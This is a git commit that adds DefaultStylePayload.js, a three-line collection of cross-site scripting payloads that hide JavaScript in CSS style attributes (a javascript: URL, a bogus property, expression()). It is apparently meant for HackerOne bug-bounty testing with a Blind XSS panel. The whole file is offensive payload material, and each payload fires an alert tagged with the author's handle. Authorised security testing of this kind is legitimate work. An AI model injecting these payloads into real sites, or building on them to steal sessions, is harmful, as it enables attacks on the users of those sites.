e17777e01cdf37f459b6fb6709738262605ca708
Snowy <SnowyYT@protonmail.com>
2023-12-01 01:20:52 -0100

    Create DefaultStylePayload.js
    Basice Style payloads to combine with Blind XSS API panel

---
+++ DefaultStylePayload.js
@@ -0,0 +1,3 @@
+<DIV STYLE="background-image: url(javascript:alert('HackerOne: SnowyY0_'))">
+<DIV STYLE="this-is-js-property: alert 'HackerOne: SnowyY0_';">
+<DIV STYLE="width: expression(alert('HackerOne: SnowyY0_'));">
